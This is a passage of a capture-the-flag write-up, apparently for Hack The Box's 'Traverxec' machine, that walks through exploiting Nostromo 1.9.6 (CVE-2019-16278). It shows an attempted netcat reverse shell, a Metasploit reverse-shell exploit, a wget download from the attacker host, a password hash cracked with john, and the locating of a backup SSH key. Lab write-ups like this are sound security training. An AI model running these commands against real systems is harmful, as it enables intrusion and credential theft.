class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">9</span> Apr <span class="number">2020</span> <span class="number">22</span>:<span class="number">18</span>:<span class="number">22</span> GMT</span><br><span class="line">Server: nostromo <span class="number">1.9</span><span class="number">.6</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>as you can see It give me results ‚Äì <code>www-data</code>. next I try the <code>hostname</code>:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 3</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ python cve2019_16278.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> <span class="number">80</span> hostname</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        _____<span class="number">-2019</span><span class="number">-16278</span></span><br><span class="line">        _____  _______    ______   _____\    \   </span><br><span class="line">   _____\    \_\      |  |      | /    / |    |  </span><br><span class="line">  /     /|     ||     /  /     /|/    /  /___/|  </span><br><span class="line"> /     / /____/||\    \  \    |/|    |__ |___|/  </span><br><span class="line">|     | |____|/ \ \    \ |    | |       \        </span><br><span class="line">|     |  _____   \|     \|    | |     __/ __     </span><br><span class="line">|\     \|\    \   |\         /| |\    \  /  \    </span><br><span class="line">| \_____\|    |   | \_______/ | | \____\/    |   </span><br><span class="line">| |     /____/|    \ |     | /  | |    |____/|   </span><br><span class="line"> \|_____|    ||     \|_____|/    \|____|   | |   </span><br><span class="line">        |____|/                        |___|/    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">9</span> Apr <span class="number">2020</span> <span class="number">22</span>:<span class="number">19</span>:<span class="number">45</span> GMT</span><br><span class="line">Server: nostromo <span class="number">1.9</span><span class="number">.6</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">traverxec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>and It gives me result hostname ‚Äì <code>traverxec</code>. Now since I can execute a command i‚Äôll try to use <code>netcat</code> if i can gain reverse shell, but it‚Äôs not working it gives me an error <code>Cmd line: wrong</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 3</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ python cve2019_16278.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> <span class="number">80</span> nc <span class="number">10.10</span><span class="number">.15</span><span class="number">.21</span> <span class="number">1339</span> -e /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        _____<span class="number">-2019</span><span class="number">-16278</span></span><br><span class="line">        _____  _______    ______   _____\    \   </span><br><span class="line">   _____\    \_\      |  |      | /    / |    |  </span><br><span class="line">  /     /|     ||     /  /     /|/    /  /___/|  </span><br><span class="line"> /     / /____/||\    \  \    |/|    |__ |___|/  </span><br><span class="line">|     | |____|/ \ \    \ |    | |       \        </span><br><span class="line">|     |  _____   \|     \|    | |     __/ __     </span><br><span class="line">|\     \|\    \   |\         /| |\    \  /  \    </span><br><span class="line">| \_____\|    |   | \_______/ | | \____\/    |   </span><br><span class="line">| |     /____/|    \ |     | /  | |    |____/|   </span><br><span class="line"> \|_____|    ||     \|_____|/    \|____|   | |   </span><br><span class="line">        |____|/                        |___|/    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">10</span> Apr <span class="number">2020</span> <span class="number">22</span>:<span class="number">21</span>:<span class="number">52</span> GMT</span><br><span class="line">Server: nostromo <span class="number">1.9</span><span class="number">.6</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cmd line: wrong</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><hr><h3 id="Use-Metasploit-to-Direct-Access"><a href="#Use-Metasploit-to-Direct-Access" class="headerlink" title="Use Metasploit to Direct Access"></a>Use Metasploit to Direct Access</h3><p>So I try <a href="https://www.metasploit.com/" target="_blank" rel="noopener">Rapi7 - MetaSploit</a> to direct access in the target machine and obtain remote shell, I search about <code>Nostromo exploit</code> and it is very exact what I needed so :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ msfconsole</span><br><span class="line">                                                  </span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%</span><br><span class="line">%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%</span><br><span class="line">%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%</span><br><span class="line">%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%</span><br><span class="line">%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5<span class="number">.0</span><span class="number">.80</span>-dev                          ]</span><br><span class="line">+ -- --=[ <span class="number">1983</span> exploits - <span class="number">1085</span> auxiliary - <span class="number">339</span> post       ]</span><br><span class="line">+ -- --=[ <span class="number">563</span> payloads - <span class="number">45</span> encoders - <span class="number">10</span> nops            ]</span><br><span class="line">+ -- --=[ <span class="number">7</span> evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Writing a custom module? After editing your module, why not try the reload command</span><br><span class="line"></span><br><span class="line">msf5 &gt; search nostromo</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                   Disclosure Date  Rank  Check  Description</span></span><br><span class="line">   -  ----                                   ---------------  ----  -----  -----------</span><br><span class="line">   <span class="number">0</span>  exploit/multi/http/nostromo_code_exec  <span class="number">2019</span><span class="number">-10</span><span class="number">-20</span>       good  Yes    Nostromo Directory Traversal Remote Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt;</span><br></pre></td></tr></table></figure><p>Now i will use it but first we need to see the options so I can see what is the requirements :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/http/nostromo_code_exec</span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/nostromo_code_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                    yes       The target host(s), range CIDR identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT    <span class="number">80</span>               yes       The target port (TCP)</span><br><span class="line">   SRVHOST  <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          yes       The local host to listen on. This must be an address on the local machine <span class="keyword">or</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">   SRVPORT  <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default <span class="keyword">is</span> randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default <span class="keyword">is</span> random)</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Automatic (Unix In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt;</span><br></pre></td></tr></table></figure><h3 id="Get-in-into-the-machine"><a href="#Get-in-into-the-machine" class="headerlink" title="Get in into the machine"></a>Get in into the machine</h3><p>So <code>RHOSTS</code> or the target host which is the <em>Traverxec</em> and <code>LHOST</code> or the <em>attackers</em> IP (me) that I will input and do the exploitation.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt; set RHOSTS <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span></span><br><span class="line">RHOSTS =&gt; 10.10.10.165</span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt; set LHOST <span class="number">10.10</span><span class="number">.15</span><span class="number">.21</span></span><br><span class="line">LHOST =&gt; 10.10.15.21</span><br><span class="line">msf5 exploit(multi/http/nostromo_code_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">10.10</span><span class="number">.15</span><span class="number">.21</span>:<span class="number">4444</span> </span><br><span class="line">[*] Configuring Automatic (Unix In-Memory) target</span><br><span class="line">[*] Sending cmd/unix/reverse_perl command payload</span><br><span class="line">[*] Command shell session 1 opened (10.10.15.21:4444 -&gt; 10.10.10.165:51530) at 2020-04-11 06:45:16 +0800</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure><p>so I have now direct access to machine. but I need to upgrade it into interactive shell with <em>python</em> :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash");'</span></span><br></pre></td></tr></table></figure><p>Finally I have now the <code>www-data</code> :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/usr/bin$ id</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">www-data@traverxec:/usr/bin$</span><br></pre></td></tr></table></figure><h3 id="WWW-DATA"><a href="#WWW-DATA" class="headerlink" title="WWW-DATA"></a>WWW-DATA</h3><p>Now that i‚Äôm in, the enumeration start again‚Äô to do this quickly I use <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum.sh</a> this script is very useful if the attacker is trying to look what they need to do exploit exploit or use some stuffs for privilege escalation so from my Kali Linux machine I‚Äôll transfer <code>LinEnum.sh</code> in <code>/tmp</code> folder and run it.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">systemd-private-587b5e2d5cd0457081bf5a03c6d18e2a-systemd-timesyncd.service-TqSk1v</span><br><span class="line">vmware-root</span><br><span class="line">vmware-root_557-4282236562</span><br><span class="line">www-data@traverxec:/tmp$ wget http://10.10.15.21/LinEnum.sh</span><br><span class="line">wget http://10.10.15.21/LinEnum.sh</span><br><span class="line">--2020-04-10 19:02:22--  http://10.10.15.21/LinEnum.sh</span><br><span class="line">Connecting to 10.10.15.21:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 46631 (46K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">'LinEnum.sh'</span></span><br><span class="line"></span><br><span class="line">LinEnum.sh          100%[===================&gt;]  45.54K  59.0KB/s    <span class="keyword">in</span> 0.8s    </span><br><span class="line"></span><br><span class="line">2020-04-10 19:02:24 (59.0 KB/s) - <span class="string">'LinEnum.sh'</span> saved [46631/46631]</span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">LinEnum.sh</span><br><span class="line">linux-exploit-suggester.sh</span><br><span class="line">systemd-private-587b5e2d5cd0457081bf5a03c6d18e2a-systemd-timesyncd.service-TqSk1v</span><br><span class="line">vmware-root</span><br><span class="line">vmware-root_557-4282236562</span><br><span class="line">www-data@traverxec:/tmp$</span><br></pre></td></tr></table></figure><p>And ofcourse running this it will give us a basic information about the target :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp$ bash LinEnum.sh</span><br><span class="line">bash LinEnum.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment"># Local Linux Enumeration &amp; Privilege Escalation Script #</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment"># www.rebootuser.com</span></span><br><span class="line"><span class="comment"># version 0.982</span></span><br><span class="line"></span><br><span class="line">[-] Debug Info</span><br><span class="line">[+] Thorough tests = Disabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan started at:</span><br><span class="line">Fri Apr 10 19:03:30 EDT 2020</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### SYSTEM ##############################################</span></span><br><span class="line">[-] Kernel information:</span><br><span class="line">Linux traverxec 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Kernel information (continued):</span><br><span class="line">Linux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Specific release information:</span><br><span class="line">PRETTY_NAME=<span class="string">"Debian GNU/Linux 10 (buster)"</span></span><br><span class="line">NAME=<span class="string">"Debian GNU/Linux"</span></span><br><span class="line">VERSION_ID=<span class="string">"10"</span></span><br><span class="line">VERSION=<span class="string">"10 (buster)"</span></span><br><span class="line">VERSION_CODENAME=buster</span><br><span class="line">ID=debian</span><br><span class="line">HOME_URL=<span class="string">"https://www.debian.org/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"https://www.debian.org/support"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"https://bugs.debian.org/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Hostname:</span><br><span class="line">traverxec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### USER/GROUP ##########################################</span></span><br><span class="line">[-] Current user/group info:</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>and there‚Äôs a previously login and that will be our user named ‚Äì <code>david</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[-] Users that have previously logged onto the system:</span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root             tty1                      Sat Nov 16 16:07:31 -0500 2019</span><br><span class="line">david            pts/4    10.10.15.162     Fri Apr 09 18:59:23 -0400 2020</span><br></pre></td></tr></table></figure><p>I can also see what‚Äôs the user password in <code>/etc/passwd</code> based on <code>david:x:1000:1000:david,,,:/home/david:/bin/bash</code> :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[-] Contents of /etc/passwd:</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">david:x:1000:1000:david,,,:/home/david:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>but the script is doing that for me ;)</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[-] htpasswd found - could contain passwords:</span><br><span class="line">/var/nostromo/conf/.htpasswd</span><br><span class="line">david:<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/</span><br></pre></td></tr></table></figure><p>Now that I have a password hash for <em>david</em> I use john decrypt it with <code>rockyou.txt</code> wordlists. and I got the password <code>Nowonly4me</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ john david --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Warning: detected hash type <span class="string">"md5crypt"</span>, but the <span class="keyword">string</span> <span class="keyword">is</span> also recognized <span class="keyword">as</span> <span class="string">"md5crypt-long"</span></span><br><span class="line">Use the <span class="string">"--format=md5crypt-long"</span> option to force loading these <span class="keyword">as</span> that type instead</span><br><span class="line">Using <span class="keyword">default</span> input encoding: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="function">password <span class="title">hash</span> (<span class="params">md5crypt, crypt(<span class="number">3</span></span>) $1$ (<span class="params">and variants</span>) [MD5 256/256 AVX2 8x3])</span></span><br><span class="line"><span class="function">Will run 4 OpenMP threads</span></span><br><span class="line"><span class="function">Press 'q' or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span></span><br><span class="line"><span class="function"><span class="title">Nowonly4me</span>       (<span class="params">david</span>)</span></span><br><span class="line"><span class="function">1g 0:00:05:49 <span class="title">DONE</span> (<span class="params"><span class="number">2020</span><span class="number">-04</span><span class="number">-11</span> <span class="number">07</span>:<span class="number">12</span></span>) 0.002864g/s 30305p/s 30305c/s 30305C/s Noyoudo..Nous4</span>=<span class="number">5</span></span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> took <span class="number">5</span>m49s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>I try to login into SSH with I password I got but it seems is not the right password. It just a rabbit hole. so moved on try to look again with other stuffs. so I‚Äôll go at home directory it doesn‚Äôt allow me to look into files.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/usr/bin$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data@traverxec:/home$ ls</span><br><span class="line">ls</span><br><span class="line">david</span><br><span class="line">www-data@traverxec:/home$ cd david</span><br><span class="line">cd david</span><br><span class="line">www-data@traverxec:/home/david$ ls</span><br><span class="line">ls</span><br><span class="line">ls: cannot open directory <span class="string">'.'</span>: Permission denied</span><br><span class="line">www-data@traverxec:/home/david$</span><br></pre></td></tr></table></figure><p>So I‚Äôll try to look more on the machine folder‚Äô I go first at <code>/var/</code> directory and I see a <em><code>nostromo</code></em> which is very interesting.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david$ <span class="built_in">cd</span> /var</span><br><span class="line"><span class="built_in">cd</span> /var</span><br><span class="line">www-data@traverxec:/var$ ls</span><br><span class="line">ls</span><br><span class="line">backups  cache  lib  <span class="built_in">local</span>  lock  <span class="built_in">log</span>  mail  nostromo  opt  run  spool  tmp</span><br><span class="line">www-data@traverxec:/var$</span><br></pre></td></tr></table></figure><p>Looking at the nostromo folder there was a <code>configuration file</code> which is the <code>nhttpd.conf</code> and this will give me a big hint what to do next.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/var/nostromo$ ls</span><br><span class="line">ls</span><br><span class="line">conf  htdocs  icons  logs</span><br><span class="line">www-data@traverxec:/var/nostromo$ file conf</span><br><span class="line">file conf</span><br><span class="line">conf: directory</span><br><span class="line">www-data@traverxec:/var/nostromo$ <span class="built_in">cd</span> conf</span><br><span class="line"><span class="built_in">cd</span> conf</span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ ls</span><br><span class="line">ls</span><br><span class="line">mimes  nhttpd.conf</span><br><span class="line">www-data@traverxec:/var/nostromo/conf$</span><br></pre></td></tr></table></figure><p>The <code>nhttpd.conf</code> has given instructions :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf</span><br><span class="line">cat nhttpd.conf</span><br><span class="line"><span class="comment"># MAIN [MANDATORY]</span></span><br><span class="line"></span><br><span class="line">servername              traverxec.htb</span><br><span class="line">serverlisten            *</span><br><span class="line">serveradmin             david@traverxec.htb</span><br><span class="line">serverroot              /var/nostromo</span><br><span class="line">servermimes             conf/mimes</span><br><span class="line">docroot                 /var/nostromo/htdocs</span><br><span class="line">docindex                index.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># LOGS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">logpid                  logs/nhttpd.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># SETUID [RECOMMENDED]</span></span><br><span class="line"></span><br><span class="line">user                    www-data</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASIC AUTHENTICATION [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">htaccess                .htaccess</span><br><span class="line">htpasswd                /var/nostromo/conf/.htpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ALIASES [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">/icons                  /var/nostromo/icons</span><br><span class="line"></span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">homedirs                /home</span><br><span class="line">homedirs_public         public_www</span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">homedirs                /home</span><br><span class="line">homedirs_public         public_www</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/var/nostromo/conf$</span><br></pre></td></tr></table></figure><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="HOME-DIRECTORY"><a href="#HOME-DIRECTORY" class="headerlink" title="HOME DIRECTORY"></a>HOME DIRECTORY</h3><p>based on the line <code>$HOMEDIRS</code> we can access <code>/public_www</code> at <code>/home/david</code> directory even it is given us permission‚Äôs denied so i go back to the david‚Äôs directory and enter to <em><code>public_www</code></em> folder</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ <span class="built_in">cd</span> /home/david</span><br><span class="line"><span class="built_in">cd</span> /home/david</span><br><span class="line">www-data@traverxec:/home/david$ ls</span><br><span class="line">ls</span><br><span class="line">ls: cannot open directory <span class="string">'.'</span>: Permission denied</span><br><span class="line">www-data@traverxec:/home/david$ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david$ <span class="built_in">cd</span> public_www</span><br><span class="line"><span class="built_in">cd</span> public_www</span><br><span class="line">www-data@traverxec:/home/david/public_www$ ls</span><br><span class="line">ls</span><br><span class="line">index.html  protected-file-area</span><br><span class="line">www-data@traverxec:/home/david/public_www$</span><br></pre></td></tr></table></figure><p>well there was a <code>protected-file-area</code> and I think it contains data hoping that this one is password but it is a <code>backup-ssh-key</code> not bad ! so :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david/public_www$ <span class="built_in">cd</span> protected-file-area</span><br><span class="line"><span class="built_in">cd</span> protected-file-area</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ ls</span><br><span class="line">ls</span><br><span class="line">backup-ssh-identity-files.tgz</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$</span><br></pre></td></tr></table></figure><p>Well since I dont have permission on that folder to do <code>write</code> I unzip and copy the <em>.tgz</em> file into <code>/tmp</code> directory so :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ tar zxvf 